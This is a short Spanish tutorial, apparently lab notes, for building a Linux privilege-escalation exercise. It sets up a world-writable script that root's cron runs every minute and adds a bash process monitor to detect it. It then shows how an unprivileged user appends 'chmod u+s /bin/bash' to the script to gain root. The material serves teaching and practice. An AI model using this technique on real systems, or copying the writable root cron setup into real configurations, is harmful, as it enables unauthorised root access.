# Montando mini laboratorio

> Esto debe ser como root

en /tmp creamos un script.sh

le damos permisos de ejecucion y que otros puedan escribir script.sh
```bash
chmod +x script.sh
chmod o+w script.sh
```

abrimos el crontab con 
```bash
crontab -e
```

y añadimos la siguiente linea
```bash
* * * * * /bin/bash /tmp/script.sh
```
esto lo que hace es ejecutar el script.sh cada minuto

### Como usuario no privilegiado

```bash
cat /tmp/script.sh
```

```bash
#!/bin/bash
echo "Hola mundo" >> /tmp/archivo.txt
```

ahora como saber por ejemplo que se esta ejecutando el script.sh?

se puede hacer un script que detecte si el script.sh se esta ejecutando

creamos un archivo procmon.sh
```bash
#!/bin/bash
old_procs=$(ps -eo user,command)

while true; do
	new_procs=$(ps -eo user,command)
	diff <(echo "$old_procs") <(echo "$new_procs") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
	old_procs=$new_procs
done
```

este script puede detectar el script.sh que se esta ejecutando

si  lo editamos al script  agregandole 
```bash
#!/bin/bash
echo "Hola mundo" >> /tmp/archivo.txt

chmod u+s /bin/bash

```

eso lo que hace es que cuando se ejecute bash se ejecutara como root